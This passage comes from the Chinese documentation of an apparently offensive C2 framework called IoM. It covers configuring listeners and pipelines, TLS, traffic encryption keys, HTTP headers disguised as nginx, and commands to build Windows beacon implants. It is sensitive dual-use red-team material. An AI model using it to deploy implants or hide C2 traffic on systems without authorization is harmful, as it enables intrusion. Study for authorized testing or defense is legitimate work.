[listener_name]\n</code></pre>"},{"location":"IoM/guideline/listener/#\u72ec\u7acb\u90e8\u7f72listener","title":"\u72ec\u7acb\u90e8\u7f72listener","text":"<p>\u4ece\u9879\u76ee\u8bbe\u8ba1\u5f00\u59cb\uff0c\u6211\u4eec\u5c31\u5c06listener\u548cserver\u89e3\u8026\uff0c\u53ef\u4ee5\u901a\u8fc7\u542f\u52a8\u547d\u4ee4\u72ec\u7acb\u90e8\u7f72listener\u3002 <pre><code>./malice-network --listener-only\n</code></pre></p> <p></p>"},{"location":"IoM/guideline/listener/#autobuild-\u914d\u7f6e","title":"autobuild \u914d\u7f6e","text":"<p>\u76ee\u524d\u542f\u52a8\u4e00\u4e2alistener\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7autobuild\u7684\u914d\u7f6e\uff0c\u6765\u63a7\u5236\u662f\u5426\u7f16\u8bd1\u4e0e\u5f53\u524dlistener\u901a\u4fe1\u7684implant\u3002</p> <p>\u5982\u679c\u9700\u8981\u7f16\u8bd1pulse artifact\uff0c\u5c06auitobuild\u7684 <code>build_pulse</code> \u8bbe\u4e3atrue\u3002</p> <pre><code>  auto_build:\n    build_pulse: true\n</code></pre> <p>\u60a8\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u9700\u6c42\uff0c\u6765\u914d\u7f6e\u81ea\u52a8\u7f16\u8bd1\u7684implant\u7684\u67b6\u6784\u548c\u901a\u4fe1\u7684pipeline\uff0cimplant\u652f\u6301\u7684\u67b6\u6784\u5728build\u4e2d\u6709\u663e\u793a\u3002autobuild\u4e2d\u7684 <code>pipeline</code> \u5b57\u6bb5\u9700\u8981\u548c\u5df2\u6709\u7684pipeline\u540d\u5bf9\u5e94\u3002</p> <pre><code>  auto_build:\n    target:\n      - x86_64-pc-windows-gnu\n      - x86_64-unknown-linux-musl\n    pipeline:\n      - tcp\n      - http\n</code></pre> <p>Tip</p> <p>autobuild\u7684\u7f16\u8bd1\u5e73\u53f0\u4f18\u5148\u7ea7\u4e3adocker &gt; github action &gt; saas\uff0c\u82e5\u4f7f\u7528saas\u7f16\u8bd1\uff0c\u9700\u786e\u4fdd\u670d\u52a1\u7aef\u7684config.yaml\u914d\u7f6e\u4e86saas\uff0c\u5e76\u4e14\u670d\u52a1\u7aef\u672a\u542f\u52a8docker\uff0c\u4e5f\u6ca1\u6709\u5728config.yaml\u4e2d\u914d\u7f6egithub\u4ed3\u5e93\u4fe1\u606f\u3002</p>"},{"location":"IoM/guideline/listener/#pipeline-\u914d\u7f6e","title":"pipeline \u914d\u7f6e","text":"<p>pipeline\u662f\u6570\u636e\u7ba1\u9053\uff0cListener\u4e0eImplant/WebShell\u4ea4\u4e92\u7684\u5177\u4f53\u5b9e\u73b0\u3002</p> <p>\u6982\u5ff5\u8bf4\u660e: Pipeline\u76f8\u5f53\u4e8e\u4f20\u7edfC2\u6846\u67b6\u4e2d\u7684Listener\u6982\u5ff5\uff0c\u4f46IoM\u8fdb\u4e00\u6b65\u7ec6\u5206\u4e86\u5176\u5b9e\u73b0\u3002\u6bcf\u4e2aListener\u53ef\u4ee5\u8fd0\u884c\u591a\u4e2aPipeline\uff0cPipeline\u8d1f\u8d23\u4e0eImplant\u7684\u5177\u4f53\u4ea4\u4e92\u3002</p> <p>Tip</p> <p>\u5177\u4f53\u67b6\u6784\u5728pipeline\u67e5\u770b</p>"},{"location":"IoM/guideline/listener/#tcp","title":"tcp","text":"<p>\u5f53\u9700\u8981\u542f\u52a8\u4e00\u4e2a\u65b0\u7684tcp pipeline\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5728config.yaml\u4e2d\u7684\u5bf9\u5e94listener\u4e0b\u589e\u52a0\u4e00\u4e2atcp\u914d\u7f6e\u3002</p> <pre><code>  tcp:\n  - name: tcp               # tcp \u540d\u5b57\n        port: 5001          # tcp \u76d1\u542c\u7684\u7aef\u53e3\n        host: 0.0.0.0       # tcp \u76d1\u542c\u7684host\n        parser: malefic     # implant\u534f\u8bae\n        enable: true        # tcp \u662f\u5426\u5f00\u542f\n        tls:                # tls\u914d\u7f6e\u9879\n          enable: false\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u5728IoM\u7684client\u7aef\u4e2d\u4f7f\u7528\u547d\u4ee4\u6dfb\u52a0\u4e00\u4e2atcp pipeline\uff1a</p> <pre><code>tcp --listener listener --host 127.0.0.1 --port 5015\n</code></pre> <p></p> <p>tcp\u547d\u4ee4</p> <p>\u5173\u4e8etcp\u547d\u4ee4\u7684\u66f4\u591a\u4f7f\u7528\u65b9\u6cd5\uff0c\u8bf7\u67e5\u9605tcp</p> <p>\u5728gui\u4e2d\uff0c\u53ef\u4ee5\u5728listener\u754c\u9762\u4e2d\u70b9\u51fbnew pipeline\uff0c\u9009\u62e9pipeline type\u4e3atcp\u540e\u6dfb\u52a0\u3002</p> <p></p>"},{"location":"IoM/guideline/listener/#http","title":"http","text":"<p>\u5f53\u60a8\u9700\u8981\u542f\u52a8\u4e00\u4e2a\u65b0\u7684http pipeline\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5728config.yaml\u4e2d\u7684\u5bf9\u5e94listener\u4e0b\u589e\u52a0\u4e00\u4e2ahttp\u914d\u7f6e\u3002</p> <pre><code>  http: \n    - name: http          # http \u540d\u5b57\n      enable: true        # http \u662f\u5426\u5f00\u542f\n      host: 0.0.0.0       # http \u76d1\u542c\u7684host\n      port: 8080          # http \u76d1\u542c\u7684\u7aef\u53e3\n      parser: malefic     # implant\u534f\u8bae\n      tls:                # tls\u914d\u7f6e\u9879\n        enable: false  \n</code></pre> <p>\u4e5f\u53ef\u4ee5\u5728IoM\u7684client\u7aef\u4e2d\u4f7f\u7528\u547d\u4ee4\u6dfb\u52a0\u4e00\u4e2ahttp pipeline\uff1a</p> <pre><code>http --listener listener --host 127.0.0.1 --port 8083\n</code></pre> <p></p> <p>http\u547d\u4ee4</p> <p>\u5173\u4e8ehttp\u547d\u4ee4\u7684\u66f4\u591a\u4f7f\u7528\u65b9\u6cd5\uff0c\u8bf7\u67e5\u9605http</p> <p>\u5728gui\u4e2d\uff0c\u53ef\u4ee5\u5728listener\u754c\u9762\u4e2d\u70b9\u51fbnew pipeline\uff0c\u9009\u62e9pipeline type\u4e3ahttp\u540e\u6dfb\u52a0\u3002 </p> <p>Tip</p> <p>pipeline\u662f\u548cimplant\u76f8\u4e92\u901a\u4fe1\u7684\uff0c\u6240\u4ee5\u4e24\u8005\u914d\u7f6e\u9700\u8981\u76f8\u4e92\u5339\u914d\uff0cimplant\u7684tcp\u548chttp\u914d\u7f6e\u5728target\u914d\u7f6e\u67e5\u770b\u3002</p>"},{"location":"IoM/guideline/listener/#website","title":"website","text":"<p>\u5f53\u60a8\u9700\u8981\u542f\u52a8\u4e00\u4e2a\u65b0\u7684website pipeline\u7684\u65f6\u5019\uff0c\u5e76\u5c06\u4e00\u4e9b\u6587\u4ef6\u6302\u8f7dwebsite pipeline \u670d\u52a1\u4e0a\u65f6\uff0c\u53ef\u4ee5\u5728config.yaml\u4e2d\u7684\u5bf9\u5e94listener\u4e0b\u589e\u52a0\u4e00\u4e2awebsite \u914d\u7f6e\u3002</p> <pre><code>  websites:             \n    - name: test                     # website \u540d\u5b57\n      port: 10049                    # website \u7aef\u53e3\n      root: \"/test\"                  # website route\u6839\u76ee\u5f55\n      enable: true                  # website \u662f\u5426\u5f00\u542f\n      content:                       # website \u6620\u5c04\u5185\u5bb9\n        - path: '\\images\\1.png'      # \u6587\u4ef6\u5728website\u7684\u6620\u5c04\u8def\u5f84\n          file: 'path\\to\\file'       # \u6587\u4ef6\u7684\u5b9e\u9645\u8def\u5f84\n          type: raw                  # \u6587\u4ef6\u7c7b\u578b\n        - path: '\\images\\2.png'\n          file: 'path\\to\\file'\n          type: raw\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u5728IoM\u7684client\u7aef\u4e2d\u4f7f\u7528\u547d\u4ee4\u6dfb\u52a0\u4e00\u4e2awebsite pipeline\uff1a <pre><code>website web-test --listener listener --port 5080 --root /web\n</code></pre></p> <p></p> <p>\u7136\u540e\u518d\u5728\u5bf9\u5e94website\u4e0a\u4f20\u6587\u4ef6 <pre><code>website add /path/to/file --website web-test --path /path\n</code></pre></p> <p></p> <p>website\u547d\u4ee4</p> <p>\u5173\u4e8ewebsite\u547d\u4ee4\u7684\u66f4\u591a\u4f7f\u7528\u65b9\u6cd5\uff0c\u8bf7\u67e5\u9605website</p> <p>\u5728gui\u4e0a\uff0c\u9700\u8981\u5148\u5728website\u754c\u9762\u4e0a\uff0c\u70b9\u51fbnew website\u6309\u94ae\uff0c\u5728website\u65b0\u5efa\u6309\u94ae\u4e2d\u8f93\u5165\u5bf9\u5e94\u4fe1\u606f\uff0c\u6765\u65b0\u5efawebsite pipeline\u3002</p> <p></p> <p>\u968f\u540e\u5728\u5bf9\u5e94website pipeline\u7684\u70b9\u51fbadd content\u6309\u94ae\uff0c\u586b\u5199\u9700\u8981\u7684website content\u540e\u6dfb\u52a0:</p> <p></p>"},{"location":"IoM/guideline/listener/#rem","title":"rem","text":"<p>\u5f53\u60a8\u9700\u8981\u542f\u52a8\u4e00\u4e2a\u65b0\u7684rem pipeline\u7684\u65f6\u5019\uff0c \u53ef\u4ee5\u5728config.yaml\u4e2d\u7684\u5bf9\u5e94listener\u4e0b\u589e\u52a0\u4e00\u4e2arem\u914d\u7f6e\u3002</p> <p><pre><code>  rem:                     \n    - name: rem_default              # rem \u540d\u5b57\n      enable: true                   # rem \u662f\u5426\u5f00\u542f\n      console: tcp://0.0.0.0:12345   # rem \u63a7\u5236\u53f0\u76d1\u542c\u5730\u5740\u548c\u8fde\u63a5\u534f\u8bae\n</code></pre> \u8fd9\u4e2apipeline\u53ef\u4ee5\u7ed9\u666e\u901a\u7684==rem==\u4e8c\u8fdb\u5236\u6587\u4ef6\u76f4\u63a5\u4f7f\u7528\uff0c \u4e5f\u53ef\u4ee5\u8ba9client\u4e0eimplant\u8fde\u63a5\u3002 \u4e0d\u518d\u9700\u8981\u4e0b\u8f7d\u72ec\u7acb\u7684==rem==\u7a0b\u5e8f\uff0c IoM\u7684server\u5c31\u53ef\u4ee5\u5f53\u4f5c==rem==\u7684\u670d\u52a1\u7aef\uff0c \u5e76\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u7ba1\u7406\u529f\u80fd\u3002</p> <p>rem\u6307\u5357</p> <p>\u5728 IoM \u4e2d\uff0c\u7edd\u5927\u90e8\u5206\u7f51\u7edc\u76f8\u5173\u529f\u80fd\u90fd\u57fa\u4e8e rem \u5b9e\u73b0\u3002\u56e0\u6b64\uff0c\u5728\u4f7f\u7528\u8fd9\u4e9b\u529f\u80fd\u524d\uff0c\u5efa\u8bae\u5148\u9605\u8bfb rem \u6587\u6863\uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u719f\u6089\u5176\u7528\u6cd5\u3002 \u5173\u4e8e\u5728 implant \u4e2d\u5982\u4f55\u4f7f\u7528 rem\uff0c\u53ef\u53c2\u8003 rem_usage\u3002</p>"},{"location":"IoM/guideline/listener/#bind-unstable","title":"bind (Unstable)","text":"<p>\u5f53\u60a8\u9700\u8981\u542f\u52a8\u4e00\u4e2a\u65b0\u7684bind pipeline\u7684\u65f6\u5019\uff0c \u53ef\u4ee5\u5728config.yaml\u4e2d\u7684\u5bf9\u5e94listener\u4e0b\u589e\u52a0\u4e00\u4e2abind\u914d\u7f6e\u3002</p> <pre><code>  bind:\n    -\n      name: bind_default            # bind \u540d\u5b57\n      enable: true                  # bind \u662f\u5426\u5f00\u542f\n</code></pre>"},{"location":"IoM/guideline/listener/#\u9ad8\u7ea7\u529f\u80fd","title":"\u9ad8\u7ea7\u529f\u80fd","text":""},{"location":"IoM/guideline/listener/#pipeline\u7684tls\u914d\u7f6e","title":"pipeline\u7684tls\u914d\u7f6e","text":"<p>\u5f53\u60a8\u7684\u9700\u8981tcp\u3001http\u548cwebsite pipeline\u4f7f\u7528tls\u65f6\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7config.yaml\u6216\u8005\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u6765\u914d\u7f6etls\u3002</p>"},{"location":"IoM/guideline/listener/#config\u914d\u7f6etls","title":"config\u914d\u7f6etls","text":"<p>\u4f7f\u7528config.yaml\u914d\u7f6etls\u65f6\uff0c\u53ea\u9700\u5728\u5bf9\u5e94\u7684pipeline\u4e0b\u589e\u52a0tls\u8bc1\u4e66\u914d\u7f6e\uff0c\u4ee5\u4e0b\u662f\u793a\u4f8bconfig\uff1a</p> <pre><code>  tcp:\n  - name: tcp               \n        port: 5001          \n        host: 0.0.0.0       \n        parser: malefic     \n        enable: true        \n        tls:                              # tls\u914d\u7f6e\u9879\n          enable: true\n</code></pre> <p>\u5f53\u60a8\u6ca1\u6709\u8bc1\u4e66\u65f6\uff0c\u53ea\u9700\u8981\u5c06config.yaml\u4e2d\u9700\u8981\u5bf9\u5e94pipeline\u7684tls\u7684 <code>enable</code> \u8bbe\u4e3atrue\uff0c\u5373\u53ef\u4f7f\u7528\u968f\u5373\u751f\u6210\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002 \u82e5\u60a8\u5df2\u7ecf\u6709\u8bc1\u4e66\uff0c\u5e76\u5e0c\u671bpipeline\u4f7f\u7528\u8be5\u8bc1\u4e66\uff0c\u5219\u53ef\u4ee5\u5c06\u8bc1\u4e66\u8def\u5f84\u586b\u5165tls\u914d\u7f6e\u4e2d\uff0c\u4ee5\u4e0b\u662f\u793a\u4f8bconfig\uff1a <pre><code>  tcp:\n  - name: tcp               \n        port: 5001          \n        host: 0.0.0.0       \n        parser: malefic     \n        enable: true        \n        tls:                              # tls\u914d\u7f6e\u9879\n          enable: true\n          cert_file: path\\to\\cert         # \u8bc1\u4e66\u6587\u4ef6\u8def\u5f84\uff0c\u652f\u6301PEM\u683c\u5f0f\u7684\u8bc1\u4e66\u6587\u4ef6\n          key_file: path\\to\\key           # \u79c1\u94a5\u6587\u4ef6\u8def\u5f84\uff0c\u652f\u6301PEM\u683c\u5f0f\u7684\u79c1\u94a5\u6587\u4ef6\n          ca_file: path\\to\\ca             # CA\u8bc1\u4e66\u6587\u4ef6\u8def\u5f84(\u53ef\u9009)\uff0c\u7528\u4e8e\u9a8c\u8bc1\u5ba2\u6237\u7aef\u8bc1\u4e66\u7684CA\u8bc1\u4e66\n</code></pre></p>"},{"location":"IoM/guideline/listener/#client\u914d\u7f6etls","title":"client\u914d\u7f6etls","text":"<p>\u4f7f\u7528client\u914d\u7f6etls\uff0c\u9700\u8981\u4fdd\u8bc1\u670d\u52a1\u5668\u5df2\u7ecf\u5b58\u50a8\u4e86\u9700\u8981\u7684\u8bc1\u4e66\u3002 \u82e5\u60a8\u9700\u8981\u670d\u52a1\u7aef\u751f\u6210\u81ea\u7b7e\u540d\u8bc1\u4e66\uff0c\u53ef\u4ee5\u7528\u8be5\u547d\u4ee4\u751f\u6210\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002</p> <pre><code>cert self_signed\n</code></pre> <p></p> <p>gui\u5219\u662f\u5728certificates\u754c\u9762\u70b9\u51fbGenerate Self-signed Certificate\u6309\u94ae\u540e\uff0c\u670d\u52a1\u7aef\u4f1a\u751f\u6210\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002</p> <p></p> <p>\u82e5\u60a8\u9700\u8981\u670d\u52a1\u7aef\u5b58\u50a8\u60a8\u7684\u5df2\u6709\u8bc1\u4e66\uff0c\u53ef\u4ee5\u7528\u8be5\u547d\u4ee4\u5c06\u8bc1\u4e66\u4e0a\u4f20\u81f3\u670d\u52a1\u7aef\u3002</p> <pre><code>cert import --cert cert.crt --key key.crt--ca-cert ca.crt\n</code></pre> <p> gui\u5219\u662f\u5728certificates\u754c\u9762\u70b9\u51fbImported Certificate\u6309\u94ae\u540e\uff0c\u8bc1\u4e66\u4e0a\u4f20\u81f3\u670d\u52a1\u7aef\u3002   \u5f53\u670d\u52a1\u5668\u5df2\u5b58\u50a8\u6240\u9700\u8bc1\u4e66\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\uff0c\u5c06pipeline\u4f7f\u7528\u65b0\u7684\u8bc1\u4e66\u914d\u7f6e\u542f\u52a8\u3002</p> <pre><code>pipeline start tcp --cert-name cert-name\n</code></pre> <p></p> <p>tls\u6307\u5357</p> <p>\u5f53\u60a8\u6253\u5f00tls\u914d\u7f6e\u65f6\uff0c\u60a8\u9700\u8981\u786e\u4fddImplant\u7684tls\u914d\u7f6e\u4e5f\u6253\u5f00\uff0cimplant\u7684tls\u914d\u7f6e\u8bf7\u5728implant_tls\u53c2\u9605\u3002 listener\u4e0a\u7684tls\u5177\u4f53\u914d\u7f6e\u53ef\u4ee5\u5728listener\u67e5\u770b\u3002</p>"},{"location":"IoM/guideline/listener/#parser","title":"Parser","text":"<p>\u5f53\u60a8\u9700\u8981\u4f7f\u7528pipline\u548cpulse\u7c7b\u578b\u7684implant\u901a\u4fe1\u65f6\uff0c\u9700\u8981\u4fee\u6539 <code>parser</code> \u5b57\u6bb5\uff0c\u8bbe\u7f6e\u4e3apulse\u5373\u53ef\u3002\u4ee5\u4e0b\u662fpulse\u914d\u7f6e\u793a\u4f8b:</p> <pre><code>    tcp:\n    - name: shellcode\n      port: 5002\n      host: 0.0.0.0\n      parser: pulse    # \u5bf9\u5e94malefic-pulse\u4e0a\u7ebf\n      enable: true\n      encryption:\n        enable: true\n        type: xor\n        key: maliceofinternal\n</code></pre> <p>parser\u6307\u5357</p> <p>\u5177\u4f53Parser\u914d\u7f6e\u53ef\u4ee5\u5728listener\u67e5\u770b\u3002</p>"},{"location":"IoM/guideline/listener/#encryption","title":"Encryption","text":"<p>\u82e5\u60a8\u9700\u8981\u6dfb\u52a0pipeline\u548cimplant\u7684\u901a\u4fe1\u52a0\u5bc6\u65f6\uff0c\u5728config.yaml\u4e0b\u5bf9\u5e94\u7684pipeline\u4e0b\u6dfb\u52a0\u65b0\u7684encryption\u5b57\u6bb5\uff0c\u5373\u53ef\u914d\u7f6e\u52a0\u5bc6\u534f\u8bae\u3002</p> <pre><code>    tcp:\n    - name: shellcode\n      port: 5002\n      host: 0.0.0.0\n      parser: pulse    \n      enable: true\n      encryption:\n        - enable: true               # \u662f\u5426\u542f\u7528\u8be5\u52a0\u5bc6\u65b9\u5f0f\n          type: aes                  # \u52a0\u5bc6\u7c7b\u578b (\u652f\u6301: aes / xor)\n          key: maliceofinternal      # \u5bc6\u94a5 (implant \u9700\u4e00\u81f4)\n</code></pre> <p>encryption\u6307\u5357</p> <p>\u5177\u4f53Encryption\u914d\u7f6e\u53ef\u4ee5\u5728listener\u67e5\u770b\u3002 \u5982\u4f55\u5728Implant\u4e0a\u914d\u7f6e\u5bf9\u5e94\u7684Encryption\uff0c\u8bf7\u5728Encryption\u67e5\u770b\u3002</p>"},{"location":"IoM/guideline/listener/#http\u81ea\u5b9a\u4e49\u54cd\u5e94\u5185\u5bb9","title":"http\u81ea\u5b9a\u4e49\u54cd\u5e94\u5185\u5bb9","text":"<p>\u5f53\u60a8\u9700\u8981\u5bf9http pipeline\u81ea\u5b9a\u4e49\u914d\u7f6e\u5bf9\u5e94\u7684\u54cd\u5e94\u5185\u5bb9,\u53ef\u4ee5\u5728config.yaml\u4e2d\u914d\u7f6e\u3002 <pre><code> http:  \n    - name: http         \n      enable: true        \n      host: 0.0.0.0       \n      port: 8080          \n      parser: malefic     \n      tls:                \n        enable: true  \n      headers:                               # \u81ea\u5b9a\u4e49\u54cd\u5e94\u5934 (map[string][]string)\n        Server: [\"nginx/1.22.0\"]\n        Content-Type: [\"text/html; charset=utf-8\"]\n        Cache-Control: [\"no-cache\"]\n      error_page: \"/var/www/error.html\"       # 404/500 \u9519\u8bef\u9875\u9762\u8def\u5f84\n      body_prefix: \"&lt;!-- prefix marker --&gt;\"   # \u6bcf\u4e2a HTTP \u54cd\u5e94 body \u524d\u7f00\u5185\u5bb9 \n      body_suffix: \"&lt;!-- suffix marker --&gt;\"   # \u6bcf\u4e2a HTTP \u54cd\u5e94 body \u540e\u7f00\u5185\u5bb9\n</code></pre> - <code>headers</code>\uff1a     \u53ef\u4ee5\u5b9a\u4e49\u591a\u4e2a HTTP \u54cd\u5e94\u5934\uff0c\u4f8b\u5982\u4f2a\u88c5\u6210 Nginx/Apache\uff0c\u6216\u8005\u8fd4\u56de\u81ea\u5b9a\u4e49\u7684 Content-Type\u3002</p> <ul> <li> <p><code>error_page</code>\uff1a     \u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\u4f5c\u4e3a\u9519\u8bef\u9875\u9762\uff0c\u8fd4\u56de\u65f6\u53ef\u66ff\u4ee3\u9ed8\u8ba4\u7684\u9519\u8bef\u5185\u5bb9\u3002</p> </li> <li> <p><code>body_prefix</code> / <code>body_suffix</code>\uff1a     \u5728 HTTP \u54cd\u5e94\u4f53\u7684\u6700\u524d/\u6700\u540e\u62fc\u63a5\u989d\u5916\u5185\u5bb9\uff0c\u7528\u4e8e\u6df7\u6dc6\u6d41\u91cf\u6216\u4f2a\u88c5\u7f51\u9875\u3002</p> </li> </ul>"},{"location":"IoM/guideline/payload/","title":"Payload","text":"<p>\u5728IoM\u4e2d\uff0cmalefic(\u5373implant)\u7684\u76f8\u5173\u7279\u6027\u662f\u901a\u8fc7\u7f16\u8bd1\u547d\u4ee4\u4e2d\u7684<code>profile</code>\u4e0e<code>build</code>\u76f8\u5173\u6307\u4ee4\u6765\u63a7\u5236\u3002</p>"},{"location":"IoM/guideline/payload/#\u901a\u8fc7\u66b4\u9732\u7684\u53c2\u6570\u6267\u884c\u7f16\u8bd1","title":"\u901a\u8fc7\u66b4\u9732\u7684\u53c2\u6570\u6267\u884c\u7f16\u8bd1","text":"<p>\u76ee\u524dbeacon\u4fe1\u9053\u652f\u6301\u65b9\u5f0f\u4e3b\u8981\u4e3atcp(tcp+tls)\u3001http(https)\u3001rem. \u4f60\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u6307\u4ee4\u6765\u5feb\u901f\u7f16\u8bd1\u4e00\u4e2a\u6240\u9700\u7684beacon.</p> <p>\u5bf9\u4e8e\u5e38\u89c4\u7684http/tcp\u76f8\u5173\u4fe1\u9053\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u6765\u8fdb\u884c\u6784\u5efa <pre><code>build beacon --addresses \"http://127.0.0.1:8080\" --target x86_64-pc-windows-gnu # http\n\nbuild beacon --addresses \"https://primary.example.com:443,https://second.example.com:443\" --target x86_64-pc-windows-gnu # https\n\nbuild beacon --addresses \"tcp://127.0.0.1:5001\" --target x86_64-pc-windows-gnu # tcp\n\nbuild beacon --addresses \"tcp+tls://127.0.0.1:5001\" --target x86_64-pc-windows-gnu # tcp with tls\n</code></pre></p> <p>\u5bf9\u4e8erem\u4fe1\u9053\uff0c\u9700\u8981\u6307\u5b9a\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u4e3arem\u7684link\u5730\u5740\uff0c\u4e00\u4e2a\u4e3arem\u8f6c\u53d1\u5230\u7684\u5b9e\u9645\u540e\u7aef\u5730\u5740.</p> <pre><code>build beacon --addresses \"tcp://127.0.0.1:5001\" --rem \"tcp://nonenonenonenone:@123.123.123.123:12345?wrapper=ls...\" --target x86_64-pc-windows-gnu\n</code></pre> <p></p> <p>\u5f53\u4f60\u62e5\u6709\u591a\u79cd\u6a21\u5f0f\u7684\u6784\u5efa\u65b9\u5f0f\u914d\u7f6e(docker\u3001saas\u3001action)\u65f6, \u4f60\u53ef\u4ee5\u901a\u8fc7<code>source</code>\u6765\u660e\u786e\u7684\u6307\u5b9a\u4f7f\u7528\u54ea\u4e00\u79cd,\u9ed8\u8ba4\u7684source\u4f18\u5148\u7ea7\u4e3a\"docker &gt; saas &gt; github action\" <pre><code>build beacon --addresses \"http://127.0.0.1:8080\" --target x86_64-pc-windows-gnu --source docker\n</code></pre></p>"},{"location":"IoM/guideline/payload/#\u901a\u8fc7profile\u8fdb\u884c\u7f16\u8bd1","title":"\u901a\u8fc7profile\u8fdb\u884c\u7f16\u8bd1","text":"<p>\u7531\u4e8e\u529f\u80fd\u7279\u6027\u7684\u590d\u6742\uff0c\u76f4\u63a5\u66b4\u9732\u7684\u53c2\u6570\u5e76\u4e0d\u80fd\u5b8c\u7f8e\u7684\u63a7\u5236\u5e76\u53d1\u6325Implant\u7684\u771f\u6b63\u5b9e\u529b. profile\u4f1a\u652f\u6301\u4f60\u505a\u66f4\u7ec6\u5316\u7684\u63a7\u5236.</p> <p>\u76ee\u524d\u5728pipeline\u542f\u52a8\u65f6\uff0c\u670d\u52a1\u7aef\u4f1a\u81ea\u52a8\u751f\u6210\u57fa\u4e8e\u8be5pipeline\u5b9a\u5236\u7684profile\uff0c\u53ef\u76f4\u63a5\u7528\u4e8eautobuild\u4ee5\u53ca\u624b\u52a8\u7f16\u8bd1</p>"},{"location":"IoM/guideline/payload/#\u4f7f\u7528pipeline\u7684\u9ed8\u8ba4profile","title":"\u4f7f\u7528pipeline\u7684\u9ed8\u8ba4profile","text":"<p>\u670d\u52a1\u7aef\u542f\u52a8\u540e\uff0c\u4f1a\u57fa\u4e8e config.yaml \u4e2d\u7684pipeline\u914d\u7f6e\u751f\u6210\u9ed8\u8ba4\u7684profile\uff0cprofileName\u683c\u5f0f\u4e3a<code>[pipelineName]_default</code></p> <p></p> <p>\u901a\u8fc7profile\u6784\u5efa\u6240\u9700\u8981\u7684beacon <pre><code>build beacon --profile tcp_default --target x86_64-pc-windows-gnu\n</code></pre></p> <p>\u6839\u636e\u521b\u5efa\u7684profile\u52a8\u6001\u4fee\u6539\u4e00\u4e9b\u7279\u6027\uff0c\u6bd4\u5982\uff1a\u8bbe\u7f6e\u521d\u59cb\u5316\u7684module\u4e3a<code>base,extend</code> <pre><code>build beacon --profile tcp_default  --target x86_64-pc-windows-gnu --modules \"base,extend\"\n</code></pre></p>"},{"location":"IoM/guideline/payload/#\u4f7f\u7528\u624b\u52a8\u5b9a\u5236\u7684profile","title":"\u4f7f\u7528\u624b\u52a8\u5b9a\u5236\u7684profile","text":""},{"location":"IoM/guideline/payload/#profile-new","title":"profile new","text":"<p>\u521b\u5efa\u4e00\u4e2a\u57fa\u4e8e5001\u7684profile <pre><code>profile new --name tcp_profile_demo --pipeline tcp_5001 \n</code></pre></p> <p>\u521b\u5efa\u4e00\u4e2a\u57fa\u4e8erem-pipeline\u4fe1\u9053\u7684profile, \u5e76\u6267\u884c\u5bf9\u5e94\u7684\u7f16\u8bd1 <pre><code>profile new --name rem_profile_demo --pipeline tcp_5001 --rem rem_default\n\nbuild beacon --profile rem_profile_demo --target x86_64-pc-windows-gnu\n</code></pre></p>"},{"location":"IoM/guideline/payload/#profile-load","title":"profile load","text":"<p><code>profile load</code>\u53ef\u4ee5\u52a0\u8f7d\u539f\u751f\u7684\u914d\u7f6e\u6587\u4ef6\u7528\u4e8e\u590d\u6742\u7684\u5b9a\u5236\u5316\u9700\u6c42. </p> <ul> <li> <p>\u81ea\u5b9a\u4e49profile\u9700\u8981\u5148\u4e0b\u8f7d\u4e00\u4e2a\u53ef\u4ee5\u4fee\u6539\u7684\u6a21\u677f https://github.com/chainreactors/malefic/blob/master/config.yaml  profile\u7684\u914d\u7f6e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a\u5927\u90e8\u5206\uff1a</p> </li> <li> <p>basic\uff1abeacon\u76f8\u5173\u914d\u7f6e</p> </li> <li> <p>pulse\uff1apulse\u76f8\u5173\u914d\u7f6e</p> </li> <li> <p>implants\uff1amodule\u30013<sup>rd</sup>\u3001\u8fd0\u884c\u65f6\u7b49\u7684\u76f8\u5173\u914d\u7f6e</p> </li> <li> <p>build\uff1aollvm\u7b49\u63a7\u5236\u9879</p> </li> </ul>"},{"location":"IoM/guideline/payload/#basic","title":"basic","text":"<p><code>basic</code> \u90e8\u5206\u4e3b\u8981\u7528\u4e8e\u8fde\u63a5\u53c2\u6570\u914d\u7f6e\uff0c\u5305\u62ec \u76ee\u6807\u5730\u5740\u3001\u534f\u8bae\u3001\u52a0\u5bc6\u3001\u4ee3\u7406\u3001\u5fc3\u8df3\u3001HTTP \u4f2a\u88c5\u5934 \u7b49\u3002</p>"},{"location":"IoM/guideline/payload/#\u76ee\u6807\u4e0e\u534f\u8bae","title":"\u76ee\u6807\u4e0e\u534f\u8bae","text":"<pre><code>basic:\n  name: \"malefic\"  \n  targets:\n    - \"127.0.0.1:8080\"\n  protocol: \"http\"          \n</code></pre> <ul> <li> <p><code>targets</code> \u652f\u6301\u5217\u8868\uff0c\u53ef\u914d\u7f6e\u591a\u4e2a\u76ee\u6807\u5730\u5740\u3002</p> </li> <li> <p><code>protocol</code> : \u901a\u4fe1\u534f\u8bae\u53ef\u4ee5\u914d\u7f6e\u4e3atcp\u548chttp\u3002</p> </li> </ul> <p><code>targets</code> \u548c <code>protocol</code> \u5fc5\u987b\u4e0e listener \u4e2d pipeline \u7684\u901a\u4fe1\u914d\u7f6e\u4e00\u81f4</p> <p>\u7531\u4e8e Implant \u4e0e listener \u7684 pipeline \u76f4\u63a5\u901a\u4fe1\uff0c\u56e0\u6b64 Implant \u4e2d\u7684 <code>targets</code> \u4e0e <code>protocol</code> \u914d\u7f6e\u9700\u8981\u4e0e pipeline \u4fdd\u6301\u4e00\u81f4\u3002</p> <p>\u6709\u5173 pipeline \u7684 TCP \u4e0e HTTP \u914d\u7f6e\uff0c\u8bf7\u53c2\u89c1 